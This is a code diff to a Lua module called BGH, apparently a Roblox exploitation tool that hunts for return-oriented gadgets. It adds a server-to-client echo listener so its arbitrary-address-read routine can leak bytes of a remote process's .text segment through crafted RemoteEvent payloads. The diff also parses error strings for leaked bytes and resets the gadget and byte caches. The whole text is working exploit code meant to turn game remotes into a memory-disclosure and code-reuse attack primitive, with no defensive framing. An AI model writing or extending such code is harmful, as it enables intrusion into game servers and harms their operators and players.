@@ -152,6 +152,7 @@ BGH.TextBase    = nil       -- .text segment start VA
 BGH.TextSize    = nil       -- .text segment size
 BGH.Gadgets     = {}        -- All confirmed gadgets
 BGH.ByteCache   = {}        -- address → byte (avoid re-reading)
+BGH.FeedbackInst= nil       -- S2C RemoteEvent for AAR echo reads
 BGH.Stats       = {
     pagesWalked     = 0,
     bytesRead       = 0,
@@ -359,23 +360,91 @@ local function readByte(remoteInst, address, baseline)
 
     for attempt = 1, CFG.ReadRetries do
         local t0 = os.clock()
-        local fireOk, fireResult = pcall(function()
-            if remoteInst:IsA("RemoteFunction") then
-                return remoteInst:InvokeServer(payload)
-            else
+
+        -- ── S2C path: RemoteEvent with a known feedback remote ─────────────────
+        -- FireServer returns nothing. Instead, open a timed OnClientEvent
+        -- listener on the feedback remote BEFORE firing so we don't miss
+        -- a fast echo. Extract the byte from the captured S2C args.
+        if remoteInst:IsA("RemoteEvent") and BGH.FeedbackInst then
+            local s2cCapture = nil
+            local conn
+            local connOk = pcall(function()
+                conn = BGH.FeedbackInst.OnClientEvent:Connect(function(...)
+                    if not s2cCapture then
+                        s2cCapture = {...}
+                    end
+                end)
+            end)
+
+            local fireOk, fireErr = pcall(function()
                 remoteInst:FireServer(payload)
-                return nil
+            end)
+            local latency = math.max(os.clock() - t0, 0.001)
+
+            -- Wait for echo, up to ReadTimeout
+            if connOk then
+                local tw = os.clock()
+                while not s2cCapture and
+                      (os.clock() - tw) < CFG.ReadTimeout do
+                    task.wait(0.02)
+                end
+                pcall(function() conn:Disconnect() end)
             end
-        end)
-        local latency = os.clock() - t0
 
-        local errStr = not fireOk and tostring(fireResult) or nil
-        local result = fireOk and fireResult or nil
+            -- Extract from S2C args first (best source)
+            if type(s2cCapture) == "table" then
+                local function scanS2C(v, depth)
+                    if depth > 4 or byte then return end
+                    if type(v) == "number" and
+                       v >= 0 and v <= 255 and
+                       math.floor(v) == v then
+                        byte   = math.floor(v)
+                        source = "S2C_NUMERIC"
+                    elseif type(v) == "string" then
+                        -- hex byte in error/value string
+                        local h = v:match("0x(%x%x)%f[^%x]")
+                        if h then
+                            byte   = tonumber(h, 16)
+                            source = "S2C_HEX"
+                        end
+                    elseif type(v) == "table" then
+                        for _, child in pairs(v) do
+                            scanS2C(child, depth + 1)
+                        end
+                    end
+                end
+                for _, arg in ipairs(s2cCapture) do
+                    scanS2C(arg, 0)
+                    if byte then break end
+                end
+            end
 
-        byte, source = extractByte(result, errStr, latency, baseline)
+            -- Fall through to error-string extraction if S2C gave nothing
+            if not byte then
+                local errStr = not fireOk and tostring(fireErr) or nil
+                byte, source = extractByte(nil, errStr, latency, baseline)
+            end
+
+        -- ── Direct path: RemoteFunction (has a real return value) ─────────────
+        else
+            local fireOk, fireResult = pcall(function()
+                if remoteInst:IsA("RemoteFunction") then
+                    return remoteInst:InvokeServer(payload)
+                else
+                    remoteInst:FireServer(payload)
+                    return nil
+                end
+            end)
+            local latency = math.max(os.clock() - t0, 0.001)
+
+            local errStr = not fireOk and tostring(fireResult) or nil
+            local result = fireOk and fireResult or nil
+
+            byte, source = extractByte(result, errStr, latency, baseline)
+        end
 
         if byte then
-            BGH.Stats.bytesRead = BGH.Stats.bytesRead + 1
+            BGH.Stats.bytesRead    = BGH.Stats.bytesRead + 1
             BGH.ByteCache[address] = byte
             if BGH.OnByteRead then
                 pcall(BGH.OnByteRead, address, byte)
@@ -1039,14 +1108,31 @@ function BGH.SetAnchor(addr)
     return true
 end
 
+-- ── Feedback remote setter ─────────────────────────────────────────────────────
+-- Called by BCS after pointer confirmation to wire the S2C echo remote
+-- into the AAR read path. Once set, readByte opens an OnClientEvent listener
+-- on this remote around each fire instead of waiting for a return value
+-- that will never arrive from a one-way RemoteEvent sink.
+function BGH.SetFeedbackRemote(inst)
+    if not inst then
+        BGH.FeedbackInst = nil
+        log("INFO", "Feedback remote cleared")
+        return
+    end
+    BGH.FeedbackInst = inst
+    log("INFO", string.format(
+        "Feedback remote set: %s (%s)", inst.Name, inst.ClassName))
+end
+
 -- ── Reset ──────────────────────────────────────────────────────────────────────
 function BGH.Reset()
     setState(BGH.STATE.IDLE)
-    BGH.Gadgets   = {}
-    BGH.ByteCache = {}
-    BGH.PEBase    = nil
-    BGH.TextBase  = nil
-    BGH.TextSize  = nil
+    BGH.Gadgets      = {}
+    BGH.ByteCache    = {}
+    BGH.PEBase       = nil
+    BGH.TextBase     = nil
+    BGH.TextSize     = nil
+    BGH.FeedbackInst = nil
     BGH.Stats     = {
         pagesWalked=0, bytesRead=0, retFound=0,
         sequencesChecked=0, forbidden=0, confirmed=0,
